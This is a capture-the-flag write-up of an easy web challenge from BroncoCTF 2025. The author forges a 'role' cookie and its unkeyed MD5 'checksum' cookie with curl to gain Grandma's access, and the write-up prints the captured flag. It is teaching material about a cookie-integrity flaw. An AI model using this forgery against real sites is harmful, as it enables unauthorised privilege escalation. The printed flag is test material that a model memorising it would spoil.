# Grandma's Secret Recipe

## Background

Grandma has been baking her world-famous cookies for decades, but she’s always kept her secret recipe locked away. Nobody—not even her most trusted kitchen helpers—knows the full list of ingredients.<br>
She insists it’s all about "the perfect balance of love and a pinch of mystery", but deep down, you know there’s more to it. Rumors say only Grandma herself is allowed to see the recipe, hidden somewhere in her kitchen.<br>
But, you were hired by Grandpa, who divorced her because she refused to share the recipe. Can you figure out the true secret behind her legendary cookies? 🍪👵

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/BroncoCTF-2025/images/image.png)

- **Difficulty: Easy**
- **This challenge doesn't have source code**

## Enumeration

Access the link, it leads me to the page that has 3 buttons: `Login`, `Logout`, `Grandma's Pantry`.

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/BroncoCTF-2025/images/image-1.png)

The page says that I'm logging in as a kitchen and only Grandma can view the secret recipe. So I decided to click the button `Grandma's Pantry` to see if I can get the secret recipe.

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/BroncoCTF-2025/images/image-2.png)

It is clearly that we can't get the secret recipe. This challenge seems to be related to cookies, so I will check on the cookies.

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/BroncoCTF-2025/images/image-3.png)

This page has two cookies: `checksum` and `role`. The `role` cookie contains the value of `"kitchen helper"` which role I'm currently login as. First, I will try to change the value of `role` to `Grandma` or `grandma` to see if I can get the recipe.<br>
I can change the value of the cookie directly, but I will use curl to improve my Linux skill:

```bash
curl --cookie "role=\"Grandma\""  https://grandma.web.broncoctf.xyz/grandma
```

Both value `"Grandma"` and `"grandma"` can't get me the recipe. I will only show the result of `"Grandma"` value:

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/BroncoCTF-2025/images/image-4.png)

Hmm, maybe I will need the use of `checksum` cookie. This cookie contains a value like a `MD5` hash. I will check if the value of `checksum` cookie is gotten from `MD5` hashing the value of `role` cookie. We need to test if the `checksum` cookie hashes the value of `role` cookie inside the quotes or includes the quotes as well.

```bash
echo -n "kitchen helper" | md5sum
```

And yes! Exactly what we think, the value of `checksum` cookie is really gotten from MD5 hashing the value of `role` cookie (without quotes):

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/BroncoCTF-2025/images/image-5.png)

## Exploitation

Now, we will test two cases of cookies:
1. `checksum`: MD5hash(`grandma`), `role`: `"grandma"`
2. `checksum`: MD5hash(`Grandma`), `role`: `"Grandma"`

First case:

```bash
echo -n "grandma" | md5sum
#a5d19cdd5fd1a8f664c0ee2b5e293167
curl --cookie "checksum=a5d19cdd5fd1a8f664c0ee2b5e293167;role=\"grandma\""  https://grandma.web.broncoctf.xyz/grandma | grep "bronco"
```

And with the first case, we got the flag!

![alt text](https://raw.githubusercontent.com/vodanh1903/CTF-Writeups/refs/heads/main/BroncoCTF-2025/images/image-6.png)

- **Flag: `bronco{grandma-makes-b3tter-cookies-than-girl-scouts-and-i-w1ll-fight-you-over-th@t-fact}`**

## Conclusion

What we've learned:

1. Cookie Manipulation